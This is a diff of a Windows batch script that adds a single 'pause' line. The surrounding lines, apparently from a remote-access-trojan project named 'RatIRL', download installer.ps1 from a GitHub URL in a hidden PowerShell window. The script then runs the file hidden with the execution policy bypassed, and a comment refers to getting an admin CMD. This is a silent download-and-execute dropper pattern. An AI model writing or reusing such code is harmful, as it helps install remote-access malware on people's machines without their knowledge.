@@ -30,4 +30,5 @@ CD /D "%~dp0"
 
 REM you can remove the 'powershell' to get an admin CMD
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/vadill0/RatIRL/main/Files/installer.ps1 -OutFile installer.ps1"
+pause
 powershell Start-Process -windowstyle hidden -ep bypass "installer.ps1"
